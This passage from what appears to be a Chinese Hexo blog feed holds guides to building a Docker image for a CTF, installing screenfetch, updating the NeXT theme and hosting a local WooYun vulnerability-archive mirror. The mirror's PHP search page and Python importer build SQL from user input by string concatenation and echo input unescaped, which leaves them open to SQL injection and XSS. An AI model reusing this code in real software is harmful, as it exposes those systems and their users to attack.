id="配置Flag项"><a href="#配置Flag项" class="headerlink" title="配置Flag项"></a>配置Flag项</h3><p>进入<code>src</code>目录，配置你需要的<code>Flag</code>项目，然后就可以打包了</p><h2 id="第五步：打包【制作】CTF用镜像"><a href="#第五步：打包【制作】CTF用镜像" class="headerlink" title="第五步：打包【制作】CTF用镜像"></a>第五步：打包【制作】CTF用镜像</h2><h3 id="打包成镜像"><a href="#打包成镜像" class="headerlink" title="打包成镜像"></a>打包成镜像</h3><p>创建完上面的<code>Dockerfile</code>后在当前目录执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -t ctf:list1 .</span><br></pre></td></tr></table></figure><p>命令原型</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build [OPTIONS] PATH | URL | -</span><br></pre></td></tr></table></figure><p>稍等片刻就可以运行<code>docker images</code>指令并能看到名为<code>ctf</code>,<code>TAG</code>为list1的镜像了</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux安装screenfetch</title>
      <link href="/p/3360701969.html"/>
      <url>/p/3360701969.html</url>
      
        <content type="html"><![CDATA[<p>screenFetch 是一个能够在截屏中显示系统/主题信息的命令行脚本。它可以在 Linux，OS X，FreeBSD 以及其它的许多类Unix系统上使用。</p><a id="more"></a><h1 id="Ubuntu系"><a href="#Ubuntu系" class="headerlink" title="Ubuntu系"></a>Ubuntu系</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install screenfetch</span><br></pre></td></tr></table></figure><p>如果源里面没有这个软件，可以采用如下方法：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://github.com/KittyKatt/screenFetch/archive/master.zip</span><br><span class="line">unzip master.zip</span><br><span class="line">sudo mv screenFetch-master/screenfetch-dev /usr/bin/screenfetch</span><br></pre></td></tr></table></figure><p>如图</p><p><img src= "/img/loading.gif" data-lazy-src="/images/VuwwG8E.png" alt=""></p><h1 id="RHEL系"><a href="#RHEL系" class="headerlink" title="RHEL系"></a>RHEL系</h1><p>如图</p><p><img src= "/img/loading.gif" data-lazy-src="/images/qKduYnE.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>更新Next主题</title>
      <link href="/p/3209274979.html"/>
      <url>/p/3209274979.html</url>
      
        <content type="html"><![CDATA[<p>没注意NeXT已经更新到6.5.0版本了<br>折腾之余顺便记录下</p><a id="more"></a><p>NeXT 6系列和5系列给笔者最直观的感受是配置文件更细了，更细带来的问题是一些JS库需要自己去下载了。。</p><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>适用于从5.X升级上来的</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>cd到博客目录然后</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/theme-next/hexo-theme-next themes/next-reloaded</span><br></pre></td></tr></table></figure><h2 id="启用"><a href="#启用" class="headerlink" title="启用"></a>启用</h2><p>在 Hexo 的主配置文件中设置主题：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">theme: next-reloaded</span><br></pre></td></tr></table></figure><p>NeXT6.X主题将在生成站点时被加载。如果你遇到了任何错误、或只是不喜欢这一新版本，你可以随时切换回旧的 v5.1.x 版本。</p><h1 id="迁移设置"><a href="#迁移设置" class="headerlink" title="迁移设置"></a>迁移设置</h1><p>正如笔者前文所述，6.X的配置文件更细了</p><h2 id="更新语言配置"><a href="#更新语言配置" class="headerlink" title="更新语言配置"></a>更新语言配置</h2><p>从 v6.0.3版本起，zh-Hans改名为zh-CN，需要在修改<strong>HEXO</strong>配置文件<code>_config.xml</code>里的<code>language</code>配置，否则语言显示不正确。</p><figure class="highlight plain"><figcaption><span>[例子]</span></figcaption><table><tr><td class="code"><pre><span class="line"># Hexo Configuration</span><br><span class="line">## Docs: https:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F;configuration.html</span><br><span class="line">## Source: https:&#x2F;&#x2F;github.com&#x2F;hexojs&#x2F;hexo&#x2F;</span><br><span class="line"></span><br><span class="line"># Site</span><br><span class="line">..........</span><br><span class="line">language: zh-CN #注意此处 zh-Hans-&gt;zh-CN</span><br><span class="line">timezone: Asia&#x2F;Shanghai</span><br><span class="line">..........</span><br><span class="line"># URL</span><br><span class="line">## If your site is put in a subdirectory, set url as &#39;http:&#x2F;&#x2F;yoursite.com&#x2F;child&#39; and root as &#39;&#x2F;child&#x2F;&#39;</span><br></pre></td></tr></table></figure><p>然后就是更新下styl文件了，官方从<code>5.*</code>-&gt;<code>6.*</code>的样式更改没多少</p><h1 id="更新后的操作"><a href="#更新后的操作" class="headerlink" title="更新后的操作"></a>更新后的操作</h1><p>更新后执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br></pre></td></tr></table></figure><p>即可使用最新主题了</p><h1 id="真香"><a href="#真香" class="headerlink" title="真香"></a>真香</h1><p>顺便加了个评论功能<br>嗯<del>~</del>真香！</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建乌云漏洞库+知识库</title>
      <link href="/p/3805269292.html"/>
      <url>/p/3805269292.html</url>
      
        <content type="html"><![CDATA[<p>乌云2年多了。。突发奇想在内网搭建个知识库+漏洞库</p><a id="more"></a><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>为了方便，我用了Windows服务器，详细配置如下</p><h2 id="服务器配置"><a href="#服务器配置" class="headerlink" title="服务器配置"></a>服务器配置</h2><blockquote><p>Windows Server 2016 DC<br>Apache 2.4.25<br>PHP 5.6.30<br>MySQL 5.7.17-log</p></blockquote><h2 id="所需文件下载地址"><a href="#所需文件下载地址" class="headerlink" title="所需文件下载地址"></a>所需文件下载地址</h2><blockquote><p>知识库：<br>链接：<a href="https://pan.baidu.com/s/1CZVZxdHzl7L8y3dGWN-aOQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1CZVZxdHzl7L8y3dGWN-aOQ</a><br>提取码：uuuo<br>漏洞库<br>链接：<a href="https://pan.baidu.com/s/1LGSwDmVwtlffyM8I-1hQzw" target="_blank" rel="noopener">https://pan.baidu.com/s/1LGSwDmVwtlffyM8I-1hQzw</a><br>提取码：8duw</p></blockquote><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="漏洞库"><a href="#漏洞库" class="headerlink" title="漏洞库"></a>漏洞库</h2><ol><li>将漏洞库中的<code>wooyun</code>目录下所有文件移入mysql的data目录，然后查看数据库中是否存在名称为wooyun的数据库库和bugs、whitehats的数据表<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SHOW DATABASES;</span></span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">| wooyun             |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> use wooyun</span></span><br><span class="line">Database changed</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SHOW TABLES;</span></span><br><span class="line">+------------------+?</span><br><span class="line">| Tables_in_wooyun |</span><br><span class="line">+------------------+</span><br><span class="line">| bugs             |</span><br><span class="line">| whitehats        |</span><br><span class="line">+------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li>更改bugs\conn.php的内容为你数据库信息</li><li>访问查看查看是否正常，如页面显示报错信息，删掉那一行即可<h2 id="知识库"><a href="#知识库" class="headerlink" title="知识库"></a>知识库</h2>知识库均为静态内容，为了方便浏览，写了个python脚本插入数据库<br>在wooyun数据库新建个drops表，SQL如下</li></ol><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`drops`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`title`</span> <span class="built_in">text</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`link`</span> <span class="built_in">text</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> AUTO_INCREMENT=<span class="number">1270</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8</span><br></pre></td></tr></table></figure><p>Python脚本如下（Python 3）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2018-10-15 14:21:13</span></span><br><span class="line"><span class="comment"># @Author  : Sp4ce</span></span><br><span class="line"><span class="comment"># @Github  : https://github.com/NS-Sp4ce</span></span><br><span class="line"><span class="comment"># @Version : 1.0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">path = <span class="string">""</span>  <span class="comment"># 乌云知识库文件夹目录</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFiles</span><span class="params">(path)</span>:</span></span><br><span class="line">    dirs = os.listdir(path)  <span class="comment"># 得到文件夹下的所有文件名称</span></span><br><span class="line">    <span class="comment">#print(dirs)</span></span><br><span class="line">    file = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> dir <span class="keyword">in</span> dirs:  <span class="comment"># 遍历文件夹</span></span><br><span class="line">        file.append(dir)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="comment"># print(files)</span></span><br><span class="line">    print(<span class="string">'文件夹读取完毕，共有'</span>+str(i)+<span class="string">'个文件'</span>)</span><br><span class="line">    <span class="keyword">return</span> file <span class="comment">#返回file</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insertDB</span><span class="params">(string)</span>:</span></span><br><span class="line">    url=<span class="string">'/content/'</span>+titles</span><br><span class="line">    conn=pymysql.connect(host=<span class="string">'localhost'</span>, port=<span class="number">3306</span>, user=<span class="string">'root'</span>, password=<span class="string">""</span>, db=<span class="string">'wooyun'</span>, charset=<span class="string">'utf8'</span>) <span class="comment">#定义数据库链接</span></span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    insert_sql =<span class="string">"""INSERT INTO drops (title,link) VALUES ('%s','%s');"""</span></span><br><span class="line">    cur.execute(insert_sql%(string,url))</span><br><span class="line">    conn.commit()</span><br><span class="line">    <span class="comment">#time.sleep(0.5)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getTitle</span><span class="params">(file)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> titles</span><br><span class="line">    <span class="keyword">for</span> titles <span class="keyword">in</span> file:</span><br><span class="line">        <span class="comment">#判断是否是文件夹，不是文件夹才打开</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(path + <span class="string">'\\'</span> + titles): </span><br><span class="line">            <span class="comment">#打开文件</span></span><br><span class="line">            <span class="keyword">with</span> open(path + <span class="string">'\\'</span> + titles, <span class="string">'r'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> files:</span><br><span class="line">                p1 = re.compile(<span class="string">'&lt;title&gt;([\s\S]*)&lt;/title&gt;'</span>) <span class="comment">#将正则表达式编译成 p1 对象</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">for</span> line <span class="keyword">in</span> files:</span><br><span class="line">                        match1 = p1.search(line)<span class="comment">#匹配</span></span><br><span class="line">                        <span class="comment">#print(match1)</span></span><br><span class="line">                        <span class="keyword">if</span> match1:</span><br><span class="line">                            string=match1.group(<span class="number">0</span>)</span><br><span class="line">                            string=string.replace(<span class="string">'&lt;title&gt;'</span>,<span class="string">''</span>)</span><br><span class="line">                            string=string.replace(<span class="string">' | WooYun知识库&lt;/title&gt;'</span>,<span class="string">''</span>)<span class="comment">#标题处理</span></span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        insertDB(string)</span><br><span class="line">                        print(<span class="string">'[+]'</span> + string + <span class="string">'&lt;-&gt;插入成功'</span>)</span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        print(<span class="string">'[-]'</span> + string + <span class="string">'&lt;-&gt;插入失败'</span>)</span><br><span class="line">                        fo = open(<span class="string">'error.txt'</span>, <span class="string">"ab+"</span>) <span class="comment">#失败记录</span></span><br><span class="line">                        fo.write((<span class="string">'\r'</span><span class="string">'[-]'</span> + string + <span class="string">"--------插入失败"</span> + <span class="string">'\r\n'</span>).encode(<span class="string">'UTF-8'</span>))</span><br><span class="line">                        fo.close()</span><br><span class="line">                      </span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    fo = open(<span class="string">'error.txt'</span>, <span class="string">"ab+"</span>)<span class="comment">#失败记录</span></span><br><span class="line">                    fo.write((<span class="string">'\r'</span><span class="string">'[-]'</span> + titles + <span class="string">"--------获取失败"</span> + <span class="string">'\r\n'</span>).encode(<span class="string">'UTF-8'</span>))</span><br><span class="line">                    fo.close()</span><br><span class="line">    <span class="keyword">return</span> titles</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    getTitle(getFiles(path))</span><br></pre></td></tr></table></figure><p>入完库后做个页面来查询【PS：写的不好 见谅。。】</p><p>dops.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'conn.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;</span><br><span class="line">        乌云知识库</span><br><span class="line">    &lt;/title&gt;</span><br><span class="line">    &lt;meta content=<span class="string">"webkit"</span> name=<span class="string">"renderer"</span>&gt;</span><br><span class="line">    &lt;meta content=<span class="string">"IE=edge,chrome=1"</span> http-equiv=<span class="string">"X-UA-Compatible"</span>&gt;</span><br><span class="line">    &lt;meta content=<span class="string">"width=device-width, initial-scale=1, maximum-scale=1"</span> name=<span class="string">"viewport"</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">"/layui/css/layui.css"</span> media=<span class="string">"all"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body class="layui-main"&gt;</span><br><span class="line">    &lt;div class="layui-container"&gt;</span><br><span class="line">        &lt;div class="layui-col-xs6 layui-col-md12"&gt;</span><br><span class="line">            &lt;div class="layui-field-title"&gt;</span><br><span class="line">                &lt;h1&gt;&lt;a href=<span class="string">"#"</span>&gt;乌云知识库&lt;/a&gt;&lt;/h1&gt;</span><br><span class="line">                &lt;h2&gt;&lt;a href=<span class="string">"#"</span>&gt;WooYun Drops&lt;/a&gt;&lt;/h2&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;hr class="layui-bg-blue"&gt;</span><br><span class="line">        &lt;div class="layui-col-xs6 layui-col-md12 layui-text-center layui-mt-5 layui-mb-5"&gt;</span><br><span class="line">            &lt;h1 class="layui-text-h1"&gt;乌云知识库&lt;/h1&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class="layui-col-xs6 layui-col-md12 layui-mt-5"&gt;</span><br><span class="line">            &lt;form class="layui-form" action="" method="get"&gt;</span><br><span class="line">                &lt;div class="layui-form-item" style="width: 90%;margin: 0 auto"&gt;</span><br><span class="line">                    &lt;div class="layui-input-inline"&gt;</span><br><span class="line">                        &lt;input type="text" name="q" required="" lay-verify="required" placeholder="搜索条件" class="layui-input"&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;button class="layui-btn layui-btn-normal" type="submit"&gt;搜索&lt;/button&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class="layui-col-xs6 layui-col-md12"&gt;</span><br><span class="line">        &lt;!--检索结果-start--&gt;</span><br><span class="line">        <span class="meta">&lt;?</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'q'</span>]))&#123;</span><br><span class="line">        @$q0=<span class="keyword">isset</span>($_GET[<span class="string">'q'</span>])?$_GET[<span class="string">'q'</span>]:<span class="string">'SQL注射'</span>;</span><br><span class="line">        @$q = str_replace(<span class="string">"'"</span>,<span class="string">""</span>,$q0);</span><br><span class="line">        $qs = mysql_query(<span class="string">"select * from drops where title like '%"</span>.@$q.<span class="string">"%' or link like '%"</span>.@$q.<span class="string">"%' group by id order by id desc"</span>);</span><br><span class="line">        $num = <span class="string">"15"</span>; <span class="comment">//每页显示30条</span></span><br><span class="line">        @$page=<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])?intval($_GET[<span class="string">'page'</span>]):<span class="number">1</span>;</span><br><span class="line">        @$total=mysql_num_rows($qs); <span class="comment">//查询数据的总数total</span></span><br><span class="line">        @$pagenum=ceil($total/$num);</span><br><span class="line">        @$offset=($page<span class="number">-1</span>)*$num;</span><br><span class="line">        @$$drops_result2222 = mysql_query(<span class="string">"select * from drops where title like '%"</span>.@$q.<span class="string">"%' or link like '%"</span>.@$q.<span class="string">"%' group by id order by id desc limit "</span>.$offset.<span class="string">",15"</span>);</span><br><span class="line">        <span class="keyword">if</span> (mysql_num_rows($$drops_result2222)&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">' </span></span><br><span class="line"><span class="string">&lt;fieldset class="layui-elem-field layui-field-title" style="margin-top: 50px;"&gt;</span></span><br><span class="line"><span class="string">                &lt;legend&gt;</span></span><br><span class="line"><span class="string">                    搜索结果</span></span><br><span class="line"><span class="string">                &lt;/legend&gt;</span></span><br><span class="line"><span class="string">            &lt;/fieldset&gt;</span></span><br><span class="line"><span class="string">            &lt;table class="layui-table"&gt;</span></span><br><span class="line"><span class="string">                &lt;colgroup&gt;</span></span><br><span class="line"><span class="string">                    &lt;col&gt;</span></span><br><span class="line"><span class="string">                    &lt;col&gt;</span></span><br><span class="line"><span class="string">                    &lt;col&gt;</span></span><br><span class="line"><span class="string">                &lt;/colgroup&gt;</span></span><br><span class="line"><span class="string">                &lt;thead&gt;</span></span><br><span class="line"><span class="string">                    &lt;tr&gt;</span></span><br><span class="line"><span class="string">                        &lt;th&gt;</span></span><br><span class="line"><span class="string">                            标题</span></span><br><span class="line"><span class="string">                        &lt;/th&gt;</span></span><br><span class="line"><span class="string">                        &lt;th&gt;</span></span><br><span class="line"><span class="string">                            链接</span></span><br><span class="line"><span class="string">                        &lt;/th&gt;</span></span><br><span class="line"><span class="string">                        &lt;th&gt;</span></span><br><span class="line"><span class="string">                            操作</span></span><br><span class="line"><span class="string">                        &lt;/th&gt;</span></span><br><span class="line"><span class="string">                    &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                &lt;/thead&gt;'</span>;</span><br><span class="line">                 <span class="keyword">echo</span> <span class="string">"&lt;tbody&gt;"</span>;</span><br><span class="line">                 <span class="keyword">while</span>(@$row223 = mysql_fetch_array($$drops_result2222))&#123;</span><br><span class="line">                 <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;"</span>;</span><br><span class="line">                 <span class="keyword">echo</span> <span class="string">'&lt;td&gt;'</span>.$row223[<span class="string">'title'</span>].<span class="string">'&lt;/td&gt;'</span>. PHP_EOL;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">'&lt;td&gt;'</span>.$row223[<span class="string">'link'</span>].<span class="string">'&lt;/td&gt;'</span>. PHP_EOL;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">'&lt;td&gt; &lt;a href="http://'</span>.$_SERVER[<span class="string">"SERVER_ADDR"</span>].$row223[<span class="string">'link'</span>].<span class="string">'" class="layui-btn layui-btn-normal"&gt;查看&lt;/a&gt;&lt;/td&gt;'</span>. PHP_EOL;</span><br><span class="line">                 <span class="keyword">echo</span> <span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;/tbody&gt;'</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;/table&gt;'</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;div  style="float:right;padding:10px 30px 0 0"&gt;'</span>;</span><br><span class="line">                @$page = $_GET[<span class="string">'page'</span>]?$_GET[<span class="string">'page'</span>]:<span class="number">1</span>;<span class="comment">//当前页数，默认是1</span></span><br><span class="line">        <span class="keyword">if</span>($page==<span class="number">1</span>)&#123;</span><br><span class="line">        $prepage=<span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $prepage=$page<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($page==$pagenum)&#123;</span><br><span class="line">        $nextpage=$pagenum;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $nextpage=$page+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;center&gt; 共 '</span>.$total.<span class="string">' 条记录'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'，'</span>.$pagenum.<span class="string">' 页 '</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;a href="drops.php?q='</span>.$q.<span class="string">'&amp;page=1" class="layui-btn layui-btn-sm"&gt;首页&lt;/a&gt;'</span>. PHP_EOL;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;a href="drops.php?q='</span>.$q.<span class="string">'&amp;page='</span>.$prepage.<span class="string">'" class="layui-btn layui-btn-primary layui-btn-sm"&gt;上一页&lt;/a&gt;'</span>. PHP_EOL;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;a href="drops.php?q='</span>.$q.<span class="string">'&amp;page='</span>.$nextpage.<span class="string">'" class="layui-btn layui-btn-primary layui-btn-sm"&gt;下一页&lt;/a&gt;'</span>. PHP_EOL;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;a href="drops.php?q='</span>.$q.<span class="string">'&amp;page='</span>.$pagenum.<span class="string">'" class="layui-btn layui-btn-danger layui-btn-sm"&gt;末页&lt;/a&gt;&lt;/center&gt;'</span>. PHP_EOL;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;blockquote class="layui-elem-quote layui-text layui-mt-5"&gt;未检索到相关内容！&lt;/blockquote&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;!---检索结果-end--&gt;</span><br><span class="line">        &lt;div class="layui-col-xs6 layui-col-md12"style="margin-bottom: 100px;"&gt;</span><br><span class="line">            &lt;fieldset class="layui-elem-field layui-field-title" style="margin-top: 50px;"&gt;</span><br><span class="line">                &lt;legend&gt;</span><br><span class="line">                    随机文章</span><br><span class="line">                &lt;/legend&gt;</span><br><span class="line">            &lt;/fieldset&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">            @$drops_random = mysql_query(<span class="string">"SELECT * FROM drops WHERE id &gt;= ((SELECT MAX(id) FROM drops)-(SELECT MIN(id) FROM drops)) * RAND() + (SELECT MIN(id) FROM drops) LIMIT 5"</span>);</span><br><span class="line">                        @$drops_random = mysql_query(<span class="string">"SELECT * FROM drops WHERE id &gt;= ((SELECT MAX(id) FROM drops)-(SELECT MIN(id) FROM drops)) * RAND() + (SELECT MIN(id) FROM drops) LIMIT 5"</span>);</span><br><span class="line">            <span class="keyword">if</span> (mysql_num_rows($drops_random)&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">' </span></span><br><span class="line"><span class="string">                    &lt;table class="layui-table"&gt;</span></span><br><span class="line"><span class="string">                        &lt;colgroup&gt;</span></span><br><span class="line"><span class="string">                            &lt;col&gt;</span></span><br><span class="line"><span class="string">                            &lt;col&gt;</span></span><br><span class="line"><span class="string">                            &lt;col&gt;</span></span><br><span class="line"><span class="string">                        &lt;/colgroup&gt;</span></span><br><span class="line"><span class="string">                    &lt;thead&gt;</span></span><br><span class="line"><span class="string">                        &lt;tr&gt;</span></span><br><span class="line"><span class="string">                            &lt;th&gt;</span></span><br><span class="line"><span class="string">                                标题</span></span><br><span class="line"><span class="string">                            &lt;/th&gt;</span></span><br><span class="line"><span class="string">                            &lt;th&gt;</span></span><br><span class="line"><span class="string">                                链接</span></span><br><span class="line"><span class="string">                            &lt;/th&gt;</span></span><br><span class="line"><span class="string">                            &lt;th&gt;</span></span><br><span class="line"><span class="string">                                操作</span></span><br><span class="line"><span class="string">                            &lt;/th&gt;</span></span><br><span class="line"><span class="string">                        &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                    &lt;/thead&gt;'</span>;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">"&lt;tbody&gt;"</span>;</span><br><span class="line">                     <span class="keyword">while</span>(@$row223333 = mysql_fetch_array($drops_random))&#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;"</span>;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">'&lt;td&gt;'</span>.$row223333[<span class="string">'title'</span>].<span class="string">'&lt;/td&gt;'</span>. PHP_EOL;</span><br><span class="line">                      <span class="keyword">echo</span> <span class="string">'&lt;td&gt;'</span>.$row223333[<span class="string">'link'</span>].<span class="string">'&lt;/td&gt;'</span>. PHP_EOL;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">'&lt;td&gt; &lt;a href="http://'</span>.$_SERVER[<span class="string">"SERVER_ADDR"</span>].$row223333[<span class="string">'link'</span>].<span class="string">'" class="layui-btn layui-btn-normal"&gt;查看&lt;/a&gt;&lt;/td&gt;'</span>. PHP_EOL;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;/tbody&gt;'</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;/table&gt;'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class="layui-footer" style="margin-top: 50px;"&gt;</span><br><span class="line">        &lt;ul&gt;</span><br><span class="line">            &lt;li&gt;&lt;a href=<span class="string">"/"</span>&gt;wooyun.org&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;script charset=<span class="string">"utf-8"</span> src=<span class="string">"/layui/layui.js"</span>&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h1 id="文件夹目录如下"><a href="#文件夹目录如下" class="headerlink" title="文件夹目录如下"></a>文件夹目录如下</h1><p><img src= "/img/loading.gif" data-lazy-src="/images/Borq1UA.png" alt="文件夹目录"></p><h1 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h1><p><img src= "/img/loading.gif" data-lazy-src="/images/YLvOj5i.png" alt="屏幕截图"></p><h1 id="所需文件"><a href="#所需文件" class="headerlink" title="所需文件"></a>所需文件</h1><p><a href="https://github.com/NS-Sp4ce/wooyun-drops-tools" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/wooyun-drops-tools</a></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Python </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>校园网搭建FBCTF平台</title>
      <link href="/p/2322302582.html"/>
      <url>/p/2322302582.html</url>
      
